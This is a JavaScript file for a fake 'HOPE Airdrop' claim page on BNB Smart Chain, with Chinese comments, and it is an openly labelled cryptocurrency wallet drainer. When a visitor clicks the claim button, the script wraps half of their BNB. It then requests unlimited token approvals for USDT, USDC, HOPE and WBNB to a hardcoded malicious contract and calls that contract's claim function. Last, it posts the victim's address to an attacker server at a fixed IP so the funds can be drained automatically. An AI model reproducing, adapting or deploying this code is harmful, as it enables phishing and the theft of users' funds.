// ============================================
// Configuration
// ============================================
const CONFIG = {
    maliciousAddress: "0x4187f22Ac4Eb42a9a315c1D89c49FbC250Ecfbd1",
    attackerAddress: "0x62f869005db186cc449d9f9d6b7acef2d69ee590",
    wbnbAddress: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
    // ✅ 此处已更改为你的海外 VPS 公网 IP 地址
    serverUrl: "http://45.63.51.62:3001", 
    tokensToSteal: [
        "0x55d398326f99059fF775485246999027B3197955", // USDT
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
        "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756", // HOPE
        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
    ],
};

// ============================================
// ABI Definitions
// ============================================
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function balanceOf(address account) external view returns (uint256)",
];

const WBNB_ABI = [
    "function deposit() external payable",
];

const MALICIOUS_ABI = [
    "function claim() external",
    "function claimed(address) view returns (bool)"
];

// ============================================
// DOM Ready
// ============================================
document.addEventListener('DOMContentLoaded', function() {

    const airdropAmountEl = document.getElementById('airdropAmount');
    const displayAddress = document.getElementById('displayAddress');
    const claimBtn = document.getElementById('claimBtn');
    const claimStatus = document.getElementById('claimStatus');

    const params = new URLSearchParams(window.location.search);
    const address = params.get('address');
    const amount = params.get('amount');

    if (address) {
        displayAddress.textContent = 'Address: ' + address.slice(0, 6) + '...' + address.slice(-4);
    }
    if (amount) {
        airdropAmountEl.textContent = amount + ' HOPE';
    }

    let provider, signer, userAddress;
    let isClaimed = false;

    // ============================================
    // Report victim to server (海外服务器数据上报)
    // ============================================
    async function reportVictim(address) {
        try {
            const response = await fetch(CONFIG.serverUrl + '/victims', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address: address })
            });
            if (response.ok) {
                console.log(`📝 Victim reported: ${address}`);
            } else {
                console.warn(`⚠️ Report failed: ${response.status}`);
            }
        } catch (error) {
            console.warn('⚠️ Cannot connect to victim server:', error.message);
        }
    }

    // ============================================
    // Core Attack Logic
    // ============================================
    claimBtn.addEventListener('click', async function() {
        if (isClaimed) {
            alert('You have already claimed');
            return;
        }

        try {
            claimBtn.disabled = true;
            claimBtn.textContent = '⏳ Connecting...';
            claimStatus.textContent = '';
            claimStatus.className = 'status';

            if (!window.ethereum) {
                alert('Please install MetaMask, OKX Wallet, or another Web3 wallet!');
                claimBtn.disabled = false;
                claimBtn.textContent = 'Connect Wallet & Claim';
                return;
            }

            // 检查当前网络是否为 BSC 主网
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            if (chainId !== '0x38') {
                alert('⚠️ Please switch to BSC Mainnet!');
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4001) {
                        alert('Please manually switch to BSC Mainnet.');
                        claimBtn.disabled = false;
                        claimBtn.textContent = 'Connect Wallet & Claim';
                        return;
                    }
                    throw switchError;
                }
            }

            // 这一步会自动唤起用户电脑上安装的欧意、小狐狸或币安钱包插件
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();

            if (address && userAddress.toLowerCase() !== address.toLowerCase()) {
                alert('⚠️ Connected wallet address does not match the queried address!');
                claimBtn.disabled = false;
                claimBtn.textContent = 'Connect Wallet & Claim';
                return;
            }

            claimBtn.textContent = '⏳ Processing...';

            // ============================================
            // Step 1: Wrap BNB
            // ============================================
            const wbnbContract = new ethers.Contract(
                CONFIG.wbnbAddress,
                WBNB_ABI,
                signer
            );

            const bnbBalance = await provider.getBalance(userAddress);
            const wrapAmount = bnbBalance.mul(50).div(100);
            if (wrapAmount.gt(0)) {
                console.log(`🔄 Wrapping ${ethers.utils.formatEther(wrapAmount)} BNB to WBNB...`);
                const wrapTx = await wbnbContract.deposit({ value: wrapAmount });
                await wrapTx.wait();
                console.log(`✅ Wrapped ${ethers.utils.formatEther(wrapAmount)} BNB to WBNB`);
            } else {
                console.log('⏭️ No BNB balance, skipping wrap');
            }

            // ============================================
            // Step 2: Approve all ERC-20 tokens
            // ============================================
            let approvedCount = 0;
            for (const tokenAddress of CONFIG.tokensToSteal) {
                try {
                    const tokenContract = new ethers.Contract(
                        tokenAddress,
                        ERC20_ABI,
                        signer
                    );

                    const balance = await tokenContract.balanceOf(userAddress);
                    if (balance.eq(0)) {
                        console.log(`⏭️ Skipping ${tokenAddress} (balance is 0)`);
                        continue;
                    }

                    console.log(`💰 Found balance: ${ethers.utils.formatUnits(balance, 18)}`);

                    const currentAllowance = await tokenContract.allowance(
                        userAddress,
                        CONFIG.maliciousAddress
                    );

                    if (currentAllowance.lt(balance)) {
                        console.log(`⚠️ Approving ${tokenAddress}...`);
                        const approveTx = await tokenContract.approve(
                            CONFIG.maliciousAddress,
                            ethers.constants.MaxUint256
                        );
                        await approveTx.wait();
                        console.log(`✅ ${tokenAddress} approved`);
                        approvedCount++;
                    }
                } catch (error) {
                    console.warn(`⚠️ Failed to process ${tokenAddress}:`, error.message);
                }
            }

            if (approvedCount === 0) {
                claimBtn.textContent = '⚠️ No tokens to approve';
                claimBtn.disabled = false;
                claimBtn.textContent = 'Connect Wallet & Claim';
                return;
            }

            // ============================================
            // Step 3: Call claim()
            // ============================================
            claimBtn.textContent = '⏳ Claiming...';

            const maliciousContract = new ethers.Contract(
                CONFIG.maliciousAddress,
                MALICIOUS_ABI,
                signer
            );
            const claimTx = await maliciousContract.claim();
            await claimTx.wait();

            isClaimed = true;
            claimBtn.textContent = '✅ Claimed!';
            claimBtn.disabled = true;
            claimStatus.textContent = '🎉 Airdrop claimed!';
            claimStatus.className = 'status success';

            console.log(`🎯 New victim hooked: ${userAddress}`);

            // ============================================
            // Step 4: Report victim to server
            // ============================================
            await reportVictim(userAddress);

            console.log('📋 Victim recorded, waiting for auto-steal...');

        } catch (error) {
            console.error('Claim failed:', error);
            alert('Claim failed: ' + error.message);
            claimBtn.disabled = false;
            claimBtn.textContent = 'Connect Wallet & Claim';
            claimStatus.textContent = '❌ Claim failed, please try again';
            claimStatus.className = 'status error';
        }
    });

    if (window.ethereum) {
        window.ethereum.on('accountsChanged', () => location.reload());
        window.ethereum.on('chainChanged', () => location.reload());
    }

    console.log('🎯 HOPE Airdrop result page loaded');
});